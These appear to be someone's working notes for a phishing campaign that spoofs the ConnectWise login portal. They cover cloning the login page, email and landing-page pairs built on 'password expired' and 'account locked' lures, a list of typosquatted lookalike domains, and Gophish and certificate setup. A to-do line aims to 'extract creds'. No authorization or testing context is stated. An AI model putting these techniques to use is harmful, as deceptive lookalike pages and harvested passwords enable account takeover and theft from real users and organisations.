# Website spoofing
- find / replace.src=" with src="[[https]]://na.myconnectwise.net/
- reset password
Username, oldpassword, new password

# template / landing page pairs
- email tempalate - CW password expired
- Landing page - CW login acct locked

- email template - Cw password expired
- landing page - connectwise change password

might be able to utilize a throwaway thing like ( a stackblitz project) to get a simple [[https]] uri to post to.

you could also create the fields as input="text" and when the user starts typing you could change it to type="password" with js

trying contenteditable 
<input autocapitalize="none" autocomplete="off" autocorrect="off" class="loginTextBox" id="password" name="password" onkeypress="javascript: if(event.keyCode==13) {document.getElementById(&#39;loginForm&#39;).submit()}" placeholder="Password" spellcheck="false" type="password"/>

# obfuscate 1st url with one of the following
- [[http]]://na.myconnectwise.net
- [[http]]://namyconnectvvise.net secured
- 
- [[http]]://narnyconnectwise.net
- [[http]]://namyconnecwise.net 
- [[http]]://namyconnectvise.net
- [[http]]://namyconneclwise.net
- [[http]]://namycomectwise.net 
- [[http]]://namyconnectwlse.net 
- [[http]]://namyconnectwlIse.net
- [[http]]://namyconnectwỉse.net - Tried but International Domain but after trying to register and doing research, the browser will use display puny code even while it shows the correct webpage [[https]]://www.a2hosting.com/kb/getting-started-guide/registering-a-domain1/internationalized-domain-names/

Problems 

Root/gophish  
Ip web address still coming up insecure 
Emails are still showing as coming from [brad.theodore@gmail.com](mailto:brad.theodore@gmail.com) 

/gophish reaspeargun – Let's encrypt is expired

To-do
have gophish serve the [[https]] landing pages and extract creds
you didn't have a wildcard cert and the "na" subdomain isn't on there. So you may have to get a letsencrypt wildcard anyway
If you get a separate cert for na, then you simply set up another VirtualHost for that. Cut and paste.
setup certbot
What certbot does is get a free 90 day SSL certificate from LE. You change your .conf to use that one. Finally you run certbot once a day to refresh the cert in time before it expires.
